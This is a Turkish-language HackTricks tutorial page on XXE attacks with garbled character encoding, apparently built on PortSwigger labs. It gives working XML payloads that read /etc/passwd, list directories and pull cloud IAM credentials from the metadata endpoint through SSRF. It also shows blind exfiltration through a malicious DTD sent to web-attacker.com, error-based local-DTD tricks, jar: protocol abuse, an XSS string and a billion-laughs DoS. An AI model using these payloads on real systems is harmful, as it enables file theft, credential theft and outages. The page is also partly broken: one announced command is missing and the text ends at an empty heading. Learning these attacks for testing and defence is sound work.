# XXE - XEE - XML Harici VarlÄ±k

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>


## XML Temelleri

XML, veri depolama ve taÅŸÄ±ma iÃ§in tasarlanmÄ±ÅŸ bir iÅŸaretleme dilidir ve aÃ§Ä±klayÄ±cÄ± adlandÄ±rÄ±lmÄ±ÅŸ etiketlerin kullanÄ±mÄ±na izin veren esnek bir yapÄ±ya sahiptir. HTML'den, Ã¶nceden tanÄ±mlanmÄ±ÅŸ bir etiket kÃ¼mesine sÄ±nÄ±rlÄ± olmamasÄ±yla farklÄ±lÄ±k gÃ¶sterir. JSON'un yÃ¼kseliÅŸiyle XML'nin Ã¶nemi azalmÄ±ÅŸtÄ±r, ancak AJAX teknolojisindeki ilk rolÃ¼ne raÄŸmen.

- **VarlÄ±klar AracÄ±lÄ±ÄŸÄ±yla Veri Temsili**: XML'deki varlÄ±klar, `&lt;` ve `&gt;` gibi Ã¶zel karakterlerin temsil edilmesini saÄŸlar. Bu karakterler, XML'in etiket sistemiyle Ã§akÄ±ÅŸmayÄ± Ã¶nlemek iÃ§in `<` ve `>` ile eÅŸleÅŸir.

- **XML ElemanlarÄ±nÄ±n TanÄ±mlanmasÄ±**: XML, eleman tÃ¼rlerinin tanÄ±mlanmasÄ±na izin verir ve elemanlarÄ±n nasÄ±l yapÄ±landÄ±rÄ±lmasÄ± gerektiÄŸini ve hangi iÃ§eriÄŸe sahip olabileceÄŸini belirler. Ä°Ã§erik tÃ¼rÃ¼nden belirli alt elemanlara kadar her tÃ¼rlÃ¼ iÃ§eriÄŸi iÃ§erebilir.

- **Belge TÃ¼rÃ¼ TanÄ±mÄ± (DTD)**: DTD'ler, belgenin yapÄ±sÄ±nÄ± ve iÃ§erebileceÄŸi veri tÃ¼rlerini tanÄ±mlamak iÃ§in XML'de Ã¶nemlidir. Ä°Ã§, dÄ±ÅŸ veya bir kombinasyon olabilirler ve belgelerin nasÄ±l biÃ§imlendirildiÄŸini ve doÄŸrulandÄ±ÄŸÄ±nÄ± yÃ¶nlendirirler.

- **Ã–zel ve Harici VarlÄ±klar**: XML, esnek veri temsili iÃ§in DTD iÃ§inde Ã¶zel varlÄ±klarÄ±n oluÅŸturulmasÄ±nÄ± destekler. URL ile tanÄ±mlanan harici varlÄ±klar, Ã¶zellikle XML Harici VarlÄ±k (XXE) saldÄ±rÄ±larÄ± baÄŸlamÄ±nda gÃ¼venlik endiÅŸelerine neden olur. Bu saldÄ±rÄ±lar, XML ayrÄ±ÅŸtÄ±rÄ±cÄ±larÄ±nÄ±n harici veri kaynaklarÄ±nÄ± nasÄ±l iÅŸlediÄŸini sÃ¶mÃ¼rÃ¼r: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`

- **Parametre VarlÄ±klarÄ±yla XXE Tespiti**: Geleneksel yÃ¶ntemlerin ayrÄ±ÅŸtÄ±rÄ±cÄ± gÃ¼venlik Ã¶nlemleri nedeniyle baÅŸarÄ±sÄ±z olduÄŸu durumlarda, Ã¶zellikle XXE zafiyetlerini tespit etmek iÃ§in XML parametre varlÄ±klarÄ± kullanÄ±labilir. Bu varlÄ±klar, DNS sorgularÄ±nÄ± tetikleyen veya kontrol edilen bir alan adÄ±na HTTP istekleri gÃ¶nderen gibi baÄŸlantÄ± dÄ±ÅŸÄ± tespit tekniklerine izin verir ve zafiyeti doÄŸrular.
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`


## Ana saldÄ±rÄ±lar

**[Bu saldÄ±rÄ±larÄ±n Ã§oÄŸu, harika Portswiggers XEE laboratuvarlarÄ± kullanÄ±larak test edildi: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### Yeni VarlÄ±k testi

Bu saldÄ±rÄ±da, basit bir yeni VARLIK bildiriminin Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± test edeceÄŸim.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### Dosya Okuma

FarklÄ± yollarla `/etc/passwd` dosyasÄ±nÄ± okumayÄ± deneyelim. Windows iÃ§in `C:\windows\system32\drivers\etc\hosts` dosyasÄ±nÄ± okumayÄ± deneyebilirsiniz.

Bu ilk durumda, dikkat edin ki SYSTEM "_\*\*file:///\*\*etc/passwd_" da Ã§alÄ±ÅŸacaktÄ±r.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

Bu ikinci durum, web sunucusunun PHP kullandÄ±ÄŸÄ± durumlarda bir dosya Ã§Ä±karmak iÃ§in kullanÄ±ÅŸlÄ± olabilir (Portswiggers laboratuvarlarÄ±nÄ±n durumu deÄŸil).
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Bu Ã¼Ã§Ã¼ncÃ¼ durumda, `Element stockCheck`'i ANY olarak tanÄ±mladÄ±ÄŸÄ±mÄ±zÄ± farkedin.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Dizin listeleme

**Java** tabanlÄ± uygulamalarda, XXE aracÄ±lÄ±ÄŸÄ±yla bir dizinin iÃ§eriÄŸini listelemek mÃ¼mkÃ¼n olabilir. AÅŸaÄŸÄ±daki gibi bir payload ile (dosya yerine sadece dizini isteyerek):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Bir XXE, bir bulutta bir SSRF'yi kÃ¶tÃ¼ye kullanmak iÃ§in kullanÄ±labilir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### KÃ¶r SSRF

Ã–nceden yorumlanan teknik kullanÄ±larak sunucunun, zayÄ±f noktalarÄ±nÄ± gÃ¶stermek iÃ§in kontrol ettiÄŸiniz bir sunucuya eriÅŸmesini saÄŸlayabilirsiniz. Ancak, bu Ã§alÄ±ÅŸmÄ±yorsa, muhtemelen **XML varlÄ±klarÄ±na izin verilmiyor** demektir. Bu durumda **XML parametre varlÄ±klarÄ±nÄ±** deneyebilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "KÃ¶r" SSRF - Verileri dÄ±ÅŸarÄ±ya Ã§Ä±kar

**Bu durumda, sunucunun, bir dosyanÄ±n iÃ§eriÄŸini HTTP isteÄŸi aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderecek olan kÃ¶tÃ¼ amaÃ§lÄ± bir yÃ¼k iÃ§eren yeni bir DTD yÃ¼klemesini saÄŸlayacaÄŸÄ±z (Ã§ok satÄ±rlÄ± dosyalar iÃ§in bunu** _**ftp://**_** Ã¼zerinden dÄ±ÅŸarÄ±ya Ã§Ä±karmayÄ± deneyebilirsiniz). Bu aÃ§Ä±klama,** [**Portswiggers lab burada**](https://portswigger.net/web-security/xxe/blind)** temel alÄ±nmÄ±ÅŸtÄ±r.**

KÃ¶tÃ¼ amaÃ§lÄ± DTD'de, verileri dÄ±ÅŸarÄ±ya Ã§Ä±karmak iÃ§in bir dizi adÄ±m gerÃ§ekleÅŸtirilir:

### KÃ¶tÃ¼ AmaÃ§lÄ± DTD Ã–rneÄŸi:
YapÄ± aÅŸaÄŸÄ±daki gibidir:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Bu DTD tarafÄ±ndan gerÃ§ekleÅŸtirilen adÄ±mlar ÅŸunlardÄ±r:

1. **Parametre VarlÄ±klarÄ±nÄ±n TanÄ±mlanmasÄ±:**
- `/etc/hostname` dosyasÄ±nÄ±n iÃ§eriÄŸini okuyan bir XML parametre varlÄ±ÄŸÄ± olan `%file` oluÅŸturulur.
- BaÅŸka bir XML parametre varlÄ±ÄŸÄ± olan `%eval` tanÄ±mlanÄ±r. Dinamik olarak yeni bir XML parametre varlÄ±ÄŸÄ± olan `%exfiltrate`'i bildirir. `%exfiltrate` varlÄ±ÄŸÄ±, URL'nin sorgu dizgisinde `%file` varlÄ±ÄŸÄ±nÄ±n iÃ§eriÄŸini ileterek saldÄ±rganÄ±n sunucusuna HTTP isteÄŸi yapacak ÅŸekilde ayarlanÄ±r.

2. **VarlÄ±klarÄ±n YÃ¼rÃ¼tÃ¼lmesi:**
- `%eval` varlÄ±ÄŸÄ± kullanÄ±lÄ±r ve `%exfiltrate` varlÄ±ÄŸÄ±nÄ±n dinamik bildiriminin yÃ¼rÃ¼tÃ¼lmesine yol aÃ§ar.
- ArdÄ±ndan `%exfiltrate` varlÄ±ÄŸÄ± kullanÄ±lÄ±r ve dosyanÄ±n iÃ§eriÄŸini iÃ§eren belirtilen URL'ye HTTP isteÄŸi yapar.

SaldÄ±rgan, bu kÃ¶tÃ¼ amaÃ§lÄ± DTD'yi genellikle `http://web-attacker.com/malicious.dtd` gibi kendi kontrolÃ¼ndeki bir sunucuda barÄ±ndÄ±rÄ±r.

**XXE YÃ¼kÃ¼:**
Zafiyetli bir uygulamayÄ± sÃ¶mÃ¼rmek iÃ§in saldÄ±rgan bir XXE yÃ¼kÃ¼ gÃ¶nderir:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Bu payload, XML parametre varlÄ±ÄŸÄ± `%xxe`'yi tanÄ±mlar ve bunu DTD iÃ§ine dahil eder. Bir XML ayrÄ±ÅŸtÄ±rÄ±cÄ± tarafÄ±ndan iÅŸlendiÄŸinde, bu payload saldÄ±rganÄ±n sunucusundan harici DTD'yi alÄ±r. AyrÄ±ÅŸtÄ±rÄ±cÄ± daha sonra DTD'yi iÃ§eride yorumlar ve kÃ¶tÃ¼ amaÃ§lÄ± DTD'de belirtilen adÄ±mlarÄ± gerÃ§ekleÅŸtirerek `/etc/hostname` dosyasÄ±nÄ±n saldÄ±rganÄ±n sunucusuna sÄ±zmasÄ±na neden olur.


### Hata TabanlÄ± (Harici DTD)

**Bu durumda, sunucunun hata mesajlarÄ±nÄ± gÃ¶rebiliyorsanÄ±z, bir dosyanÄ±n iÃ§eriÄŸini bir hata mesajÄ±nda gÃ¶steren kÃ¶tÃ¼ amaÃ§lÄ± bir DTD yÃ¼klemesini saÄŸlayacaÄŸÄ±z.** [**Buradan Ã¶rnek alÄ±nmÄ±ÅŸtÄ±r.**](https://portswigger.net/web-security/xxe/blind)

KÃ¶tÃ¼ amaÃ§lÄ± bir harici Document Type Definition (DTD) kullanarak, `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini ortaya Ã§Ä±karan bir XML ayrÄ±ÅŸtÄ±rma hatasÄ± mesajÄ± tetiklenebilir. Bunun iÃ§in aÅŸaÄŸÄ±daki adÄ±mlar izlenir:

1. `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini iÃ§eren `file` adÄ±nda bir XML parametre varlÄ±ÄŸÄ± tanÄ±mlanÄ±r.
2. `eval` adÄ±nda bir XML parametre varlÄ±ÄŸÄ± tanÄ±mlanÄ±r ve `error` adÄ±nda baÅŸka bir XML parametre varlÄ±ÄŸÄ± iÃ§in dinamik bir bildirim iÃ§erir. Bu `error` varlÄ±ÄŸÄ± deÄŸerlendirildiÄŸinde, `file` varlÄ±ÄŸÄ±nÄ±n iÃ§eriÄŸini adÄ± olarak kullanarak var olmayan bir dosya yÃ¼klemeye Ã§alÄ±ÅŸÄ±r.
3. `eval` varlÄ±ÄŸÄ± Ã§aÄŸrÄ±lÄ±r ve `error` varlÄ±ÄŸÄ±nÄ±n dinamik olarak bildirilmesine yol aÃ§ar.
4. `error` varlÄ±ÄŸÄ±nÄ±n Ã§aÄŸrÄ±lmasÄ±, var olmayan bir dosya yÃ¼klemeye Ã§alÄ±ÅŸarak, `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini dosya adÄ±nÄ±n bir parÃ§asÄ± olarak iÃ§eren bir hata mesajÄ± Ã¼retir.

KÃ¶tÃ¼ amaÃ§lÄ± harici DTD, aÅŸaÄŸÄ±daki XML ile Ã§aÄŸrÄ±labilir:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
## XXE (XML External Entity) - DÄ±ÅŸsal XML VarlÄ±k

YÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼nde, web sunucusunun yanÄ±tÄ± `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini gÃ¶steren bir hata mesajÄ± iÃ§ermelidir.

![](<../.gitbook/assets/image (223) (1).png>)

_**LÃ¼tfen dikkat edin, harici DTD, ikinci bir varlÄ±ÄŸÄ± (****`eval`****) iÃ§ermemize izin verir, ancak iÃ§sel DTD'de bu yasaktÄ±r. Bu nedenle, genellikle harici bir DTD kullanmadan bir hata zorlayamazsÄ±nÄ±z.**_

### **Hata TabanlÄ± (sistem DTD)**

Peki, **dÄ±ÅŸ baÄŸlantÄ±lar engellendiÄŸinde** (harici baÄŸlantÄ±lar kullanÄ±lamaz), kÃ¶r XXE zafiyetleri hakkÄ±nda ne dÃ¼ÅŸÃ¼nÃ¼yorsunuz?

XML dil spesifikasyonundaki bir aÃ§Ä±k, bir belgenin DTD'sinin iÃ§ ve dÄ±ÅŸ bildirimleri birleÅŸtirdiÄŸinde hata mesajlarÄ± aracÄ±lÄ±ÄŸÄ±yla hassas verilerin ortaya Ã§Ä±kmasÄ±na neden olabilir. Bu sorun, harici bir DTD'de orijinal olarak bildirilen bir XML parametre varlÄ±ÄŸÄ±nÄ±n iÃ§sel bir DTD iÃ§inden yeniden tanÄ±mlanmasÄ±na izin vererek hata tabanlÄ± XXE saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesini kolaylaÅŸtÄ±rÄ±r. Sunucu tarafÄ±ndan dÄ±ÅŸ baÄŸlantÄ±lar engellendiÄŸinde, saldÄ±rganlar hassas bilgileri ortaya Ã§Ä±karmak iÃ§in yerel DTD dosyalarÄ±na gÃ¼venmek zorundadÄ±r.

Sunucunun dosya sistemi `/usr/local/app/schema.dtd` konumunda bir DTD dosyasÄ± iÃ§eriyorsa ve bu dosyada `custom_entity` adÄ±nda bir varlÄ±k tanÄ±mlanmÄ±ÅŸsa, saldÄ±rgan aÅŸaÄŸÄ±daki gibi bir karma DTD gÃ¶ndererek `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini ortaya Ã§Ä±karacak bir XML ayrÄ±ÅŸtÄ±rma hatasÄ± oluÅŸturabilir:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
AÅŸaÄŸÄ±da belirtilen adÄ±mlar bu DTD tarafÄ±ndan gerÃ§ekleÅŸtirilir:

- `local_dtd` adÄ±nda bir XML parametre varlÄ±k tanÄ±mÄ±, sunucunun dosya sisteminde bulunan harici DTD dosyasÄ±nÄ± iÃ§erir.
- `custom_entity` XML parametre varlÄ±ÄŸÄ± iÃ§in bir yeniden tanÄ±mlama gerÃ§ekleÅŸir. Bu varlÄ±k, baÅŸlangÄ±Ã§ta harici DTD'de tanÄ±mlanmÄ±ÅŸ olup [hata tabanlÄ± XXE saldÄ±rÄ±sÄ±nÄ±](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) iÃ§ermektedir. Bu yeniden tanÄ±mlama, `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini ortaya Ã§Ä±karan bir ayrÄ±ÅŸtÄ±rma hatasÄ± oluÅŸturmak amacÄ±yla tasarlanmÄ±ÅŸtÄ±r.
- `local_dtd` varlÄ±ÄŸÄ± kullanÄ±larak, harici DTD etkinleÅŸtirilir ve yeni tanÄ±mlanan `custom_entity` kapsanÄ±r. Bu iÅŸlemler dizisi, saldÄ±rÄ± tarafÄ±ndan hedeflenen hata mesajÄ±nÄ±n yayÄ±nlanmasÄ±na neden olur.


**GerÃ§ek dÃ¼nya Ã¶rneÄŸi:** GNOME masaÃ¼stÃ¼ ortamÄ±nÄ± kullanan sistemler genellikle `/usr/share/yelp/dtd/docbookx.dtd` konumunda `ISOamso` adÄ±nda bir varlÄ±k iÃ§eren bir DTD'ye sahiptir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Bu teknik, bir **dahili DTD kullandÄ±ÄŸÄ±ndan Ã¶nce geÃ§erli bir DTD bulmanÄ±z gerekmektedir**. Bunun iÃ§in, sunucunun kullandÄ±ÄŸÄ± **iÅŸletim sistemi/yazÄ±lÄ±mÄ± yÃ¼kleyerek** veya sistemlerin iÃ§indeki **varsayÄ±lan DTD'lerin bir listesini alarak** ve **var olup olmadÄ±ÄŸÄ±nÄ± kontrol ederek** aynÄ± DTD'leri arayabilirsiniz:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Daha fazla bilgi iÃ§in [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind) adresini kontrol edin.

### Sistem iÃ§inde DTD'leri bulma

AÅŸaÄŸÄ±daki harika github deposunda, sistemde bulunabilecek DTD'lerin yollarÄ±nÄ± bulabilirsiniz:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

AyrÄ±ca, **kurban sistemin Docker gÃ¶rÃ¼ntÃ¼sÃ¼ne** sahipseniz, aynÄ± depodaki aracÄ± kullanarak **gÃ¶rÃ¼ntÃ¼yÃ¼ tarama** ve sistem iÃ§inde bulunan **DTD'lerin yolunu bulma** imkanÄ±nÄ±z vardÄ±r. NasÄ±l yapÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in [github'Ä±n Readme](https://github.com/GoSecure/dtd-finder) dosyasÄ±nÄ± okuyun.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### Office Open XML Parseleri AracÄ±lÄ±ÄŸÄ±yla XXE

Bu saldÄ±rÄ±nÄ±n daha ayrÄ±ntÄ±lÄ± bir aÃ§Ä±klamasÄ± iÃ§in, **Detectify'nin [bu harika yazÄ±sÄ±nÄ±n](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) ikinci bÃ¶lÃ¼mÃ¼ne bakabilirsiniz**.

**BirÃ§ok web uygulamasÄ±, Microsoft Office belgelerini yÃ¼klemek iÃ§in** olanak saÄŸlar ve ardÄ±ndan bu belgelerden belirli ayrÄ±ntÄ±larÄ± Ã§Ä±karÄ±r. Ã–rneÄŸin, bir web uygulamasÄ± kullanÄ±cÄ±larÄ±n bir XLSX formatÄ±ndaki elektronik tabloyu yÃ¼klemelerine izin verebilir. Analizcilerin verileri elektronik tablodan Ã§Ä±karmasÄ± iÃ§in en az bir XML dosyasÄ±nÄ± ayrÄ±ÅŸtÄ±rmasÄ± gerekmektedir.

Bu zafiyeti test etmek iÃ§in, **XXE yÃ¼kÃ¼ iÃ§eren bir Microsoft Office dosyasÄ± oluÅŸturmak gereklidir**. Ä°lk adÄ±m, belgenin aÃ§Ä±labilmesi iÃ§in boÅŸ bir dizin oluÅŸturmaktÄ±r.

Belge aÃ§Ä±ldÄ±ktan sonra, `./unzipped/word/document.xml` konumunda bulunan XML dosyasÄ± tercih edilen bir metin dÃ¼zenleyicide (Ã¶rneÄŸin vim) aÃ§Ä±lÄ±p dÃ¼zenlenmelidir. XML, genellikle bir HTTP isteÄŸiyle baÅŸlayan istenen XXE yÃ¼kÃ¼nÃ¼ iÃ§erecek ÅŸekilde deÄŸiÅŸtirilmelidir.

DeÄŸiÅŸtirilmiÅŸ XML satÄ±rlarÄ±, iki kÃ¶k XML nesnesi arasÄ±na yerleÅŸtirilmelidir. Ä°stekler iÃ§in izlenebilir bir URL ile URL'nin yerini deÄŸiÅŸtirmek Ã¶nemlidir.

Son olarak, kÃ¶tÃ¼ amaÃ§lÄ± poc.docx dosyasÄ±nÄ± oluÅŸturmak iÃ§in dosya sÄ±kÄ±ÅŸtÄ±rÄ±labilir. Daha Ã¶nce oluÅŸturulan "unzipped" dizininden aÅŸaÄŸÄ±daki komut Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r:

Åimdi, oluÅŸturulan dosya potansiyel olarak savunmasÄ±z olan web uygulamasÄ±na yÃ¼klenebilir ve Burp Collaborator gÃ¼nlÃ¼klerinde bir isteÄŸin gÃ¶rÃ¼nmesi umulabilir.


### Jar: ProtokolÃ¼

**jar** protokolÃ¼ yalnÄ±zca **Java uygulamalarÄ±** iÃ§inde eriÅŸilebilir hale getirilmiÅŸtir. Bu, hem yerel hem de uzak dosyalara hizmet eden bir **PKZIP** arÅŸivinde dosya eriÅŸimini mÃ¼mkÃ¼n kÄ±lmak iÃ§in tasarlanmÄ±ÅŸtÄ±r (Ã¶rneÄŸin `.zip`, `.jar`, vb.).
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
PKZIP dosyalarÄ± iÃ§indeki dosyalara eriÅŸebilmek, sistem DTD dosyalarÄ± aracÄ±lÄ±ÄŸÄ±yla XXE'yi kÃ¶tÃ¼ye kullanmak iÃ§in **son derece kullanÄ±ÅŸlÄ±dÄ±r.** Sistem DTD dosyalarÄ±nÄ± kÃ¶tÃ¼ye kullanma hakkÄ±nda bilgi edinmek iÃ§in [bu bÃ¶lÃ¼mÃ¼ kontrol edin](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

PKZIP arÅŸivi iÃ§indeki bir dosyaya jar protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla eriÅŸme sÃ¼reci ÅŸu adÄ±mlarÄ± iÃ§erir:

1. Belirtilen bir konumdan (`https://download.website.com/archive.zip` gibi) zip arÅŸivini indirmek iÃ§in bir HTTP isteÄŸi yapÄ±lÄ±r.
2. ArÅŸivi iÃ§eren HTTP yanÄ±tÄ± geÃ§ici olarak sistemde saklanÄ±r, genellikle `/tmp/...` gibi bir konumda.
3. ArÅŸiv, iÃ§eriÄŸine eriÅŸmek iÃ§in Ã§Ä±karÄ±lÄ±r.
4. ArÅŸiv iÃ§indeki belirli dosya, `file.zip`, okunur.
5. Ä°ÅŸlem tamamlandÄ±ktan sonra, bu sÃ¼reÃ§te oluÅŸturulan geÃ§ici dosyalar silinir.

Bu sÃ¼reci ikinci adÄ±mda kesmek iÃ§in ilginÃ§ bir teknik, arÅŸiv dosyasÄ±nÄ± sunarken sunucu baÄŸlantÄ±sÄ±nÄ± sÃ¼rekli aÃ§Ä±k tutmaktÄ±r. Bu amaÃ§la [bu depoda](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) bulunan araÃ§lar kullanÄ±labilir, bunlar arasÄ±nda bir Python sunucusu (`slow_http_server.py`) ve bir Java sunucusu (`slowserver.jar`) bulunur.
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
GeÃ§ici bir dizine dosya yazmak, yerel dosya dahil etme, ÅŸablon enjeksiyonu, XSLT RCE, serileÅŸtirme vb. bir yol geÃ§iÅŸi iÃ§eren baÅŸka bir zafiyeti **yÃ¼kseltmeye yardÄ±mcÄ± olabilir**.
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
#### DoS

#### Milyar GÃ¼len SaldÄ±rÄ±sÄ±

Billion Laugh Attack (Milyar GÃ¼len SaldÄ±rÄ±sÄ±) olarak da bilinen DoS (Hizmet DÄ±ÅŸÄ± BÄ±rakma) saldÄ±rÄ±larÄ±, XML dÄ±ÅŸ etkilerini (XXE) kullanarak hedef sistemdeki kaynaklarÄ± tÃ¼ketmeyi amaÃ§lar. Bu saldÄ±rÄ± tÃ¼rÃ¼, hedef sistemdeki XML ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ±nÄ±n aÅŸÄ±rÄ± yÃ¼klenmesine neden olur.

Bu saldÄ±rÄ±, bir XML dosyasÄ±nda yer alan bir dÄ±ÅŸ etki tanÄ±mÄ± (external entity definition) kullanÄ±larak gerÃ§ekleÅŸtirilir. Bu tanÄ±m, bir varlÄ±k (entity) olarak adlandÄ±rÄ±lan bir dÄ±ÅŸ dosyaya veya kaynaÄŸa iÅŸaret eder. SaldÄ±rgan, bu varlÄ±k referansÄ±nÄ± bir milyar kez tekrarlayarak XML ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ±nÄ±n aÅŸÄ±rÄ± yÃ¼klenmesine neden olur.

Bu saldÄ±rÄ± sonucunda, hedef sistemdeki kaynaklar tÃ¼kenir ve hizmetler kullanÄ±lamaz hale gelir. Bu tÃ¼r saldÄ±rÄ±lar, hedef sistemdeki XML ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ±nÄ±n yanÄ±t vermemesine veya Ã§Ã¶kmesine neden olabilir.
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml SaldÄ±rÄ±sÄ±

